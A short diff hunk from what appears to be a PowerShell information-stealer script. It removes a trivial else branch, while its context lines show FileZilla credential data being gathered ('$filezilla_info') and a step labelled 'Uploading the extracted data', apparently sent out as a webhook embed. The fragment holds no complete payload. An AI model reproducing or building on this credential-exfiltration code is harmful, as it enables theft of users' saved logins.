@@ -1032,9 +1032,6 @@ FileZilla: $filezilla_info
             'False'
         }
     }
-    else {
-        'False'
-    }
 
     Write-Host "[!] Uploading the extracted data !" -ForegroundColor Green
     $embed_and_body = @{
